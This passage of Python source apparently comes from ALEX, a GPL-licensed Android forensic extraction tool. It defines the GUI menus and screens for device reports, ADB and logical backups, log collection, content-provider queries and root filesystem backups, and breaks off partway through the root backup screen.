#!/usr/bin/env python3
# ALEX - Android Logical Extractor (c) C.Peter 2025
# Licensed under GPLv3 License

import sys
import os
if sys.stdout is None:
    sys.stdout = open(os.devnull, "w")
if sys.stderr is None:
    sys.stderr = open(os.devnull, "w")
import customtkinter as ctk
from PIL import ImageTk, Image, ExifTags, ImageDraw, ImageFont
import tkinter.ttk as ttk
from datetime import datetime, timedelta, timezone, date
from tkinter import StringVar
from importlib.metadata import version
from adbutils._utils import append_path
from io import BytesIO
from pathlib import Path
from pdfme import build_pdf
from alex import ufed_style, devdump
import numpy as np
import sqlite3
import shutil
import json
import zipfile
import tarfile
import hashlib
import imagehash
import tempfile
import threading
import adbutils
import subprocess
import platform
import shutil
import socket
import select
import stat
import time
import typing
import pathlib
import re
import io

ctk.set_appearance_mode("dark")  # Dark Mode
ctk.set_default_color_theme(os.path.join(os.path.dirname(__file__), "assets" , "alex_theme.json" ))
ctk.set_window_scaling(1.0)
ctk.set_widget_scaling(1.0) 

class MyApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.stop_event = threading.Event()
        if getattr(sys, 'frozen', False):
            self.report_callback_exception = self.global_exception_handler
            threading.excepthook = lambda args: self.global_exception_handler(args.exc_type, args.exc_value, args.exc_traceback)
            sys.excepthook = lambda exc_type, exc_value, exc_traceback: self.global_exception_handler(exc_type, exc_value, exc_traceback)

        # Define Window
        self.title(f"Android Logical Extractor {a_version}")
        self.geometry(f"{resx}x{resy}")
        self.resizable(False, False)
        if platform.uname().system == "Darwin":
            self.iconpath = ImageTk.PhotoImage(file=os.path.join(os.path.dirname(__file__), "assets" , "alex.icns" ))
        else:
            self.iconpath = ImageTk.PhotoImage(file=os.path.join(os.path.dirname(__file__), "assets" , "alex.png" ))
        self.wm_iconbitmap()
        self.iconphoto(False, self.iconpath)

        # Create frames
        self.left_frame = ctk.CTkFrame(self, width=leftx, corner_radius=0, fg_color="#2E2E2E", bg_color="#2E2E2E")
        self.left_frame.grid(row=0, column=0, sticky="ns")

        self.right_frame = ctk.CTkFrame(self, width=rightx, fg_color="#212121")
        self.right_frame.grid(row=0, column=1, sticky="nsew")
        self.grid_columnconfigure(1, weight=1)

       # Font:

        ctk.FontManager.load_font(os.path.join(os.path.dirname(__file__), "assets" , "NotoSansMono-UFADE.ttf" ))
        ctk.FontManager.load_font(os.path.join(os.path.dirname(__file__), "assets" , "NotoSans-Medium.ttf" ))
        
        if platform.uname().system == 'Windows':
            self.stfont = ctk.CTkFont("Noto Sans Medium")
            self.monofont = ctk.CTkFont("Noto Sans Mono UFADE")
            self.monofont.configure(size=fsize)
        else:
            self.stfont = ctk.CTkFont("default")
        self.stfont.configure(size=fsize)

        style = ttk.Style()
        style.theme_use("clam")

        # Create frames
        self.left_frame = ctk.CTkFrame(self, width=leftx, corner_radius=0, fg_color="#2E2E2E", bg_color="#2E2E2E")
        self.left_frame.grid(row=0, column=0, sticky="ns")

        self.right_frame = ctk.CTkFrame(self, width=rightx, fg_color="#212121")
        self.right_frame.grid(row=0, column=1, sticky="nsew")
        self.grid_columnconfigure(1, weight=1)

        # Widgets (left Frame))
        if platform.uname().system == 'Windows':
            self.info_text = ctk.CTkTextbox(self.left_frame, height=resy, width=leftx, fg_color="#2E2E2E", corner_radius=0, font=self.monofont, activate_scrollbars=False)
            
        elif platform.uname().system == 'Darwin':
            self.info_text = ctk.CTkTextbox(self.left_frame, height=resy, width=leftx, fg_color="#2E2E2E", corner_radius=0, font=("Menlo", fsize), activate_scrollbars=False)
        else:
            self.info_text = ctk.CTkTextbox(self.left_frame, height=resy, width=leftx, fg_color="#2E2E2E", corner_radius=0, font=("monospace", fsize), activate_scrollbars=False)
        if state != None:
            self.info_text.configure(text_color="#abb3bd")
        else:
            self.info_text.configure(text_color="#4d4d4d")
        self.info_text.insert("0.0", device_info)
        self.info_text.configure(state="disabled")
        self.info_text.pack(padx=10, pady=10)

        # Initialize menu
        self.menu_var = StringVar(value="MainMenu")

        # Placeholder for dynamic frame
        self.dynamic_frame = ctk.CTkFrame(self.right_frame, corner_radius=0, bg_color="#212121")
        self.dynamic_frame.pack(fill="both", expand=True, padx=0, pady=0)
        self.current_menu = None

        # Show Main Menu
        self.show_noadbserver()

        self.protocol("WM_DELETE_WINDOW", self.on_close)

    def on_close(self):          
        self.destroy()
        os._exit(0)
    
    def show_main_menu(self):
         # Erase content of dynamic frame
        for widget in self.dynamic_frame.winfo_children():
            widget.destroy()
        global device
        get_client(check=True)
        if device != None:
            pass
        else:
            self.after(20)
            self.show_noadbserver()
            return()
        # Show Main Menu

        self.menu_var.set("MainMenu")
        self.current_menu = "MainMenu"
        self.skip = ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont)
        self.skip.grid(row=0, column=0, columnspan=2, sticky="w")
        if ut == True or aos == True:
            self.menu_buttons = [
                ctk.CTkButton(self.dynamic_frame, text="Reporting Options", command=lambda: self.switch_menu("ReportMenu"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Acquisition Options", command=lambda: self.switch_menu("AcqMenu"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Logging Options", command=lambda: self.switch_menu("LogMenu"), width=200, height=70, font=self.stfont, state="disabled"),
                ctk.CTkButton(self.dynamic_frame, text="Advanced Options", command=lambda: self.switch_menu("AdvMenu"), width=200, height=70, font=self.stfont),
            ]
        elif recovery == True:
            if rec_root == False:
                self.menu_buttons = [
                ctk.CTkButton(self.dynamic_frame, text="Reporting Options", command=lambda: self.switch_menu("ReportMenu"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Acquisition Options", command=lambda: self.switch_menu("AcqMenu"), width=200, height=70, font=self.stfont, state ="disabled"),
                ctk.CTkButton(self.dynamic_frame, text="Logging Options", command=lambda: self.switch_menu("LogMenu"), width=200, height=70, font=self.stfont, state="disabled"),
                ctk.CTkButton(self.dynamic_frame, text="Advanced Options", command=lambda: self.switch_menu("AdvMenu"), width=200, height=70, font=self.stfont, state="disabled"),
                ]
            else:
                self.menu_buttons = [
                ctk.CTkButton(self.dynamic_frame, text="Reporting Options", command=lambda: self.switch_menu("ReportMenu"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Acquisition Options", command=lambda: self.switch_menu("AcqMenu"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Logging Options", command=lambda: self.switch_menu("LogMenu"), width=200, height=70, font=self.stfont, state="disabled"),
                ctk.CTkButton(self.dynamic_frame, text="Advanced Options", command=lambda: self.switch_menu("AdvMenu"), width=200, height=70, font=self.stfont, state="disabled"),
                ]

        else:
            self.menu_buttons = [
            ctk.CTkButton(self.dynamic_frame, text="Reporting Options", command=lambda: self.switch_menu("ReportMenu"), width=200, height=70, font=self.stfont),
            ctk.CTkButton(self.dynamic_frame, text="Acquisition Options", command=lambda: self.switch_menu("AcqMenu"), width=200, height=70, font=self.stfont),
            ctk.CTkButton(self.dynamic_frame, text="Logging Options", command=lambda: self.switch_menu("LogMenu"), width=200, height=70, font=self.stfont),
            ctk.CTkButton(self.dynamic_frame, text="Advanced Options", command=lambda: self.switch_menu("AdvMenu"), width=200, height=70, font=self.stfont),
            ]
        self.menu_text = ["Save information about the device and installed apps.", 
                          "Allows logical, advanced logical and filesystem\nextractions.", 
                          "Collect the Bugreport, dumpsys and logcat logs",
                          "More specific options like screenshotting."]
        self.menu_textbox = []
        for btn in self.menu_buttons:
            self.menu_textbox.append(ctk.CTkLabel(self.dynamic_frame, width=right_content, height=70, font=self.stfont, anchor="w", justify="left"))

        r=1
        i=0
        for btn in self.menu_buttons:
            btn.grid(row=r,column=0, padx=30, pady=10)
            self.menu_textbox[i].grid(row=r,column=1, padx=10, pady=10)
            self.menu_textbox[i].configure(text=self.menu_text[i])
            r+=1
            i+=1

    def switch_menu(self, menu_name, **kwargs):
        # Erase content of dynamic frame
        for widget in self.dynamic_frame.winfo_children():
            widget.destroy()
        # Switch to chosen menu
        self.current_menu = menu_name
        if menu_name == "ReportMenu":
            self.show_report_menu()
        elif menu_name == "AcqMenu":
            self.show_acquisition_menu()
        elif menu_name == "LogMenu":
            self.show_log_menu()
        elif menu_name == "AdvMenu":
            self.show_advanced_menu()
        elif menu_name == "PDF":
            self.show_pdf_report()
        elif menu_name == "DevInfo":
            self.show_save_device_info()
        elif menu_name == "PullData":
            self.show_pull_data()
        elif menu_name == "AdvUFED":
            self.show_ufed_bu()
        elif menu_name == "PRFS":
            self.show_prfs()
        elif menu_name == "ADBBU":
            self.show_adb_bu()
        elif menu_name == "LogDump":
            self.show_logcat_dump()
        elif menu_name == "Dumpsys":
            self.show_dumpsys_dump()
        elif menu_name == "ScreenDevice":
            self.screen_device()
        elif menu_name == "ShotLoop":
            self.chat_shotloop()
        elif menu_name == "BugReport":
            self.show_bugreport()
        elif menu_name == "Content":
            self.show_content_dump()
        elif menu_name == "CheckRoot":
            self.show_check_root()
        elif menu_name == "RootAcq":
            self.show_root_acq_menu()
        elif menu_name == "RootFFS":
            self.show_root_ffs()
        #UT Options:
        elif menu_name == "UT_physical":
            self.show_ut_physical()


    # Function to check for adb-binary and device:
    def show_noadbserver(self):
        for widget in self.dynamic_frame.winfo_children():
            widget.destroy()
        self.after(10)
        global device
        global adb
        global paired
        get_client()

        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="center")
        self.text = ctk.CTkLabel(self.dynamic_frame, width=400, height=250, font=self.stfont, anchor="w", justify="left")    
        if adb == None:
            self.text.configure(text="No ADB Server found!\n\n" +
                            "Make sure ADB is installed (e.g. via Platform Tools)\nand available in PATH.")
            self.text.pack(pady=50)
            ctk.CTkButton(self.dynamic_frame, text="Check again", command=self.show_noadbserver).pack(pady=10)
            itext = device_info
            self.info_text.configure(state="normal")
            self.info_text.delete("0.0", "end")
            self.info_text.configure(text_color="#4d4d4d")
            self.info_text.insert("0.0", itext)
            self.info_text.configure(state="disabled")
        elif adb != None and device == None:
            self.text.configure(text="No device found!\n\n" +
                            "Make sure the device is connected and the\ndeveloper options are enabled.")
            self.text.pack(pady=50)
            ctk.CTkButton(self.dynamic_frame, text="Check again", command=self.show_noadbserver).pack(pady=10)
            itext = device_info
            self.info_text.configure(state="normal")
            self.info_text.delete("0.0", "end")
            self.info_text.configure(text_color="#4d4d4d")
            self.info_text.insert("0.0", itext)
            self.info_text.configure(state="disabled")
        elif device != None and paired == False:
            self.text.configure(text="Device is not authorized!\n\n" +
                            "Confirm the \"Always trust this Computer\" message\nand check again.")
            self.text.pack(pady=50)
            ctk.CTkButton(self.dynamic_frame, text="Check again", command=self.show_noadbserver).pack(pady=10)
            itext = device_info
            self.info_text.configure(state="normal")
            self.info_text.delete("0.0", "end")
            self.info_text.configure(text_color="#abb3bd")
            self.info_text.insert("0.0", itext)
            self.info_text.configure(state="disabled")
        elif paired == True:
            itext = device_info
            self.info_text.configure(state="normal")
            self.info_text.delete("0.0", "end")
            self.info_text.configure(text_color="#abb3bd")
            self.info_text.insert("0.0", itext)
            self.info_text.configure(state="disabled")
            self.show_cwd()

        else:
            self.text.configure(text="Unknown operation state.")
            self.text.pack(pady=50)
            itext = device_info
            self.info_text.configure(state="normal")
            self.info_text.delete("0.0", "end")
            self.info_text.configure(text_color="#abb3bd")
            self.info_text.insert("0.0", itext)
            self.info_text.configure(state="disabled")
            self.text.configure(text="ADB Server found!")
            self.text.pack(pady=50)
            pass

    # Select the working directory
    def show_cwd(self):
        for widget in self.dynamic_frame.winfo_children():
            widget.destroy()
        global dir
        if getattr(sys, 'frozen', False):
            dir = os.path.join(os.path.expanduser('~'), "ALEX_out")
        else:
            dir = os.getcwd()
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="center")
        ctk.CTkLabel(self.dynamic_frame, text="Choose Output Directory:", height=30, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.browsebutton = ctk.CTkButton(self.dynamic_frame, text="Browse", text_color="#DCE4EE", font=self.stfont, command=lambda: self.browse_cwd(self.outputbox), width=60, fg_color="#2d2d35")
        self.browsebutton.pack(side="bottom", pady=(0,b_button_offset_y), padx=(0,b_button_offset_x))
        self.outputbox = ctk.CTkEntry(self.dynamic_frame, width=360, height=20, corner_radius=0, placeholder_text=[dir])
        self.outputbox.bind(sequence="<Return>", command=lambda x: self.choose_cwd(self.outputbox))
        self.outputbox.insert(0, string=dir)
        self.outputbox.pack(side="left", pady=(110,0), padx=(130,0))  
        self.okbutton = ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.choose_cwd(self.outputbox))
        self.okbutton.pack(side="left", pady=(110,0), padx=(10,120))
    
    # Function to choose the working directoy
    def choose_cwd(self, outputbox):
        global dir
        global dir_top
        user_input = outputbox.get()
        try:
            if user_input == '':
                user_input = '.'
            os.chdir(user_input)
            dir = os.getcwd()
            pass
        except:
            os.mkdir(user_input)
            os.chdir(user_input)
            dir = os.getcwd()
        if len(dir) > 48:
            dir_top = f"{dir[:45]}..."
        else:
            dir_top = dir
        self.show_main_menu()

    # Filebrowser for working direcory
    def browse_cwd(self, outputbox):
        global dir
        olddir = dir
        self.okbutton.configure(state="disabled")
        outputbox.configure(state="disabled")
        if platform.uname().system == 'Linux':
            try:
                import crossfiledialog
                dir = crossfiledialog.choose_folder()
                if dir == "":
                    dir = olddir
            except:
                dir = ctk.filedialog.askdirectory()
                if not dir:
                    dir = olddir
        else:
            dir = ctk.filedialog.askdirectory()
            if not dir:
                dir = olddir
        self.okbutton.configure(state="enabled")
        outputbox.configure(state="normal")    
        outputbox.delete(0, "end")
        outputbox.insert(0, string=dir)

    def show_save_device_info(self):
        save_info()
        text = "Device info saved to: \ndevice_" + snr + ".txt"
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        self.text = ctk.CTkLabel(self.dynamic_frame, width=420, height=200, font=self.stfont, text=text, anchor="w", justify="left")
        self.text.pack(pady=50)
        ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=self.show_main_menu).pack(pady=10)

    #Report Menu
    def show_report_menu(self):
        self.skip = ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont)
        self.skip.grid(row=0, column=0, columnspan=2, sticky="w")
        self.menu_buttons = [
            ctk.CTkButton(self.dynamic_frame, text="Save device info", command=lambda: self.switch_menu("DevInfo"), width=200, height=70, font=self.stfont),
            ctk.CTkButton(self.dynamic_frame, text="Create PDF Report", command=lambda: self.switch_menu("PDF"), width=200, height=70, font=self.stfont),
        ]
        self.menu_text = ["Save informations about the device and\ninstalled apps. (as .txt)",
                          "Create a printable PDF device report"]
        self.menu_textbox = []
        for btn in self.menu_buttons:
            self.menu_textbox.append(ctk.CTkLabel(self.dynamic_frame, width=right_content, height=70, font=self.stfont, anchor="w", justify="left"))
        r=1
        i=0
        for btn in self.menu_buttons:
            btn.grid(row=r,column=0, padx=30, pady=10)
            self.menu_textbox[i].grid(row=r,column=1, padx=10, pady=10)
            self.menu_textbox[i].configure(text=self.menu_text[i])
            r+=1
            i+=1

        ctk.CTkButton(self.dynamic_frame, text="Back", command=self.show_main_menu).grid(row=r, column=1, padx=10, pady=10, sticky="e" )

    #Acquisition Menu
    def show_acquisition_menu(self):
        self.skip = ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont)
        self.skip.grid(row=0, column=0, columnspan=2, sticky="w")
        if ut == True or aos == True:
            self.menu_buttons = [
                ctk.CTkButton(self.dynamic_frame, text="Pull \"Home\"", command=lambda: self.switch_menu("PullData"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Physical Acquisition", command=lambda: self.switch_menu("UT_physical"), width=200, height=70, font=self.stfont),
            ]
            self.menu_text = ["Extract the content of \"Home\" as a folder.",
                            "Extract a physical image of the Block-device.\n(Requires the sudo password)"] 

        elif recovery == True:
            self.menu_buttons = [
                ctk.CTkButton(self.dynamic_frame, text="Physical Acquisition", command=lambda: self.switch_menu("UT_physical"), width=200, height=70, font=self.stfont),
            ]
            self.menu_text = ["Extract a physical image of the Block-device.\n(Block-device might be encrypted.)"] 

            
        else:
            self.menu_buttons = [
                ctk.CTkButton(self.dynamic_frame, text="Pull \"sdcard\"", command=lambda: self.switch_menu("PullData"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="ADB Backup", command=lambda: self.switch_menu("ADBBU"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Logical+ Backup\n(UFED-Style)", command=lambda: self.switch_menu("AdvUFED"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Partially Restored\nFilesystem Backup", command=lambda: self.switch_menu("PRFS"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Filesystem / Physical\nBackups (rooted)", command=lambda: self.switch_menu("CheckRoot"), width=200, height=70, font=self.stfont),
            ]
            self.menu_text = ["Extract the content of \"sdcard\" as a folder.",
                            "Perform an ADB-Backup.",
                            "Creates an advanced Logical Backup as ZIP\nwith an UFD File for PA.",
                            "Try to reconstruct parts of the device-filesystem",
                            "Show backup options for rooted devices."]            

        self.menu_textbox = []
        for btn in self.menu_buttons:
            self.menu_textbox.append(ctk.CTkLabel(self.dynamic_frame, width=right_content, height=70, font=self.stfont, anchor="w", justify="left"))
        r=1
        i=0
        for btn in self.menu_buttons:
            btn.grid(row=r,column=0, padx=30, pady=10)
            self.menu_textbox[i].grid(row=r,column=1, padx=10, pady=10)
            self.menu_textbox[i].configure(text=self.menu_text[i])
            r+=1
            i+=1

        ctk.CTkButton(self.dynamic_frame, text="Back", command=self.show_main_menu).grid(row=r, column=1, padx=10, pady=10, sticky="e" )

    #Log Menu
    def show_log_menu(self):
        self.skip = ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont)
        self.skip.grid(row=0, column=0, columnspan=2, sticky="w")
        self.menu_buttons = [
            ctk.CTkButton(self.dynamic_frame, text="Logcat (Dump)", command=lambda: self.switch_menu("LogDump"), width=200, height=70, font=self.stfont),
            ctk.CTkButton(self.dynamic_frame, text="Dumpsys", command=lambda: self.switch_menu("Dumpsys"), width=200, height=70, font=self.stfont),
            ctk.CTkButton(self.dynamic_frame, text="Bugreport", command=lambda: self.switch_menu("BugReport"), width=200, height=70, font=self.stfont),
        ]
        self.menu_text = ["Dump the saved logcat entries.\nData usually goes back to the last reboot.",
                          "Extract Dumpsys informations.",
                          "Collect the Bugreport (Dumpstate)"]
        self.menu_textbox = []
        for btn in self.menu_buttons:
            self.menu_textbox.append(ctk.CTkLabel(self.dynamic_frame, width=right_content, height=70, font=self.stfont, anchor="w", justify="left"))
        r=1
        i=0
        for btn in self.menu_buttons:
            btn.grid(row=r,column=0, padx=30, pady=10)
            self.menu_textbox[i].grid(row=r,column=1, padx=10, pady=10)
            self.menu_textbox[i].configure(text=self.menu_text[i])
            r+=1
            i+=1

        ctk.CTkButton(self.dynamic_frame, text="Back", command=self.show_main_menu).grid(row=r, column=1, padx=10, pady=10, sticky="e" )

    #Advanced Menu
    def show_advanced_menu(self):
        self.skip = ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont)
        self.skip.grid(row=0, column=0, columnspan=2, sticky="w")
        if ut == False and aos == False:
            self.menu_buttons = [
                ctk.CTkButton(self.dynamic_frame, text="Take screenshots", command=lambda: self.switch_menu("ScreenDevice"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Chat Capture", command=lambda: self.switch_menu("ShotLoop"), width=200, height=70, font=self.stfont),
                ctk.CTkButton(self.dynamic_frame, text="Query Content\nProviders", command=lambda: self.switch_menu("Content"), width=200, height=70, font=self.stfont),
            ]
        else:
            self.menu_buttons = [
            ctk.CTkButton(self.dynamic_frame, text="Take screenshots", command=lambda: self.switch_menu("ScreenDevice"), width=200, height=70, font=self.stfont),
            ctk.CTkButton(self.dynamic_frame, text="Chat Capture", command=lambda: self.switch_menu("ShotLoop"), width=200, height=70, font=self.stfont, state="disabled"),
            ctk.CTkButton(self.dynamic_frame, text="Query Content\nProviders", command=lambda: self.switch_menu("Content"), width=200, height=70, font=self.stfont, state="disabled"),
            ]
        self.menu_text = ["Take screenshots from device screen.\nScreenshots will be saved under \"screenshots\"\nas PNG.",
                          "Loop through a chat taking screenshots.",
                          "Query Data from Content Providers\nas txt or json. (calls, sms, contacts, ...)"]
        self.menu_textbox = []
        for btn in self.menu_buttons:
            self.menu_textbox.append(ctk.CTkLabel(self.dynamic_frame, width=right_content, height=70, font=self.stfont, anchor="w", justify="left"))
        r=1
        i=0
        for btn in self.menu_buttons:
            btn.grid(row=r,column=0, padx=30, pady=10)
            self.menu_textbox[i].grid(row=r,column=1, padx=10, pady=10)
            self.menu_textbox[i].configure(text=self.menu_text[i])
            r+=1
            i+=1

        ctk.CTkButton(self.dynamic_frame, text="Back", command=self.show_main_menu).grid(row=r, column=1, padx=10, pady=10, sticky="e" )

    

    #Show the Check Root
    def show_check_root(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Checking the root state ...", width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(anchor="center", pady=25)
        show_root = False
        self.change = ctk.IntVar(self, 0)
        if whoami == "root":
            show_root = True
        else:
            if su_app != None:
                self.text.configure(text="Please allow the following superuser request on the device.")
                check_su = threading.Thread(target=lambda:has_root(self.change))
                check_su.start()
                self.wait_variable(self.change)
                if self.change.get() == 1:
                    show_root = True
                else:
                    self.text.configure(text="Root access has not been confirmed.")
                    self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))
                    return
        if show_root == True:
            self.after(100, lambda: self.switch_menu("RootAcq"))
            return
        else:
            self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))
            return

    #Show rooted Backup Options
    def show_root_acq_menu(self):
        self.skip = ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont)
        self.skip.grid(row=0, column=0, columnspan=2, sticky="w")
        self.menu_buttons = [
            ctk.CTkButton(self.dynamic_frame, text="Filesystem Backup\n(rooted)", command=lambda: self.switch_menu("RootFFS"), width=200, height=70, font=self.stfont),
            ctk.CTkButton(self.dynamic_frame, text="Physical Backup", command=lambda: self.switch_menu("Dumpsys"), width=200, height=70, font=self.stfont, state="disabled"),
        ]
        self.menu_text = ["Creates a FFS Backup of an already\nrooted Device.",
                            "Creates a physical Backup of an already\nrooted Device.",]
        self.menu_textbox = []
        for btn in self.menu_buttons:
            self.menu_textbox.append(ctk.CTkLabel(self.dynamic_frame, width=right_content, height=70, font=self.stfont, anchor="w", justify="left"))
        r=1
        i=0
        for btn in self.menu_buttons:
            btn.grid(row=r,column=0, padx=30, pady=10)
            self.menu_textbox[i].grid(row=r,column=1, padx=10, pady=10)
            self.menu_textbox[i].configure(text=self.menu_text[i])
            r+=1
            i+=1

        ctk.CTkButton(self.dynamic_frame, text="Back", command=self.show_main_menu).grid(row=r, column=1, padx=10, pady=10, sticky="e" )

    #Show the Logcat-Dump Menu
    def show_logcat_dump(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Logcat (Dump)", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Dumping the stored logcat entries.\nThis may take a while.", width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(anchor="center", pady=25)
        self.change = ctk.IntVar(self, 0)
        self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="", width=585, height=20, font=self.stfont, anchor="w", justify="left")
        self.prog_text.pack()
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)
        self.progress.pack()
        self.progress.start()
        self.get_logdump = threading.Thread(target=lambda: dump_logcat(self.change))
        self.get_logdump.start()
        self.wait_variable(self.change)
        self.prog_text.pack_forget()
        self.progress.pack_forget()
        self.text.configure(text=f"The stored Logcat entries were saved under: logcat_{snr}.txt")
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("LogMenu")).pack(pady=40))

    #Show the Dumpsys-Dump Menu
    def show_dumpsys_dump(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Extract Dumpsys", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Extracting Dumpsys information.\nThis may take a while.", width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(anchor="center", pady=25)
        self.change = ctk.IntVar(self, 0)
        self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="", width=585, height=20, font=self.stfont, anchor="w", justify="left")
        self.prog_text.pack()
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)
        self.progress.pack()
        self.progress.start()
        self.get_logdump = threading.Thread(target=lambda: dump_dumpsys(self.change))
        self.get_logdump.start()
        self.wait_variable(self.change)
        self.prog_text.pack_forget()
        self.progress.pack_forget()
        self.text.configure(text=f"Dumpsys saved under: dumpsys_{snr}.txt")
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("LogMenu")).pack(pady=40))

    #Show the Content Provider screen
    def show_content_dump(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Query Content Providers", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Choose the output format:", width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(anchor="center", pady=25)
        self.change = ctk.IntVar(self, 0)
        self.choose = ctk.BooleanVar(self, False)
        self.txtb = ctk.CTkButton(self.dynamic_frame, text="TXT", font=self.stfont, command=lambda: self.choose.set(False))
        self.txtb.pack(pady=10)
        self.jsonb = ctk.CTkButton(self.dynamic_frame, text="JSON", font=self.stfont, command=lambda: self.choose.set(True))
        self.jsonb.pack(pady=10)
        self.abortb = ctk.CTkButton(self.dynamic_frame, text="Back", font=self.stfont, fg_color="#8c2c27", text_color="#DCE4EE", command=lambda: self.switch_menu("AdvMenu"))
        self.abortb.pack(pady=10)    
        self.wait_variable(self.choose)   
        self.txtb.pack_forget()
        self.jsonb.pack_forget()
        self.abortb.pack_forget()
        self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="0%", width=585, height=20, font=self.stfont, anchor="w", justify="left")
        self.prog_text.pack()
        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0)
        self.progress.set(0)
        self.prog_text.configure(text="0%")
        self.progress.pack()
        self.text.configure(text=f"Extracting Data from Content Providers.\nThis may take some time.")                          
        outformat = self.choose.get() 
        self.get_content = threading.Thread(target=lambda: query_content(self.change, self.text, self.progress, self.prog_text, json_out=outformat))
        self.get_content.start()
        self.wait_variable(self.change)
        self.prog_text.pack_forget()
        self.progress.pack_forget()
        self.text.configure(text=f"The Content Provider entries were saved under:\ncontent_provider_{snr}")
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AdvMenu")).pack(pady=40))

    #Show the Root FFS Screen
    def show_root_ffs(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Filesystem Backup", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Extracting available files from the device filesystem.", width=585, height=60, font=self.stfont, anchor="w", justify="left")
        self.text.pack(anchor="center", pady=25)
        self.change = ctk.IntVar(self, 0)
        log("Started FFS Backup")
        zip_path = f'FFS_{snr}_{str(datetime.now().strftime("%Y_%m_%d_%H_%M_%S"))}'
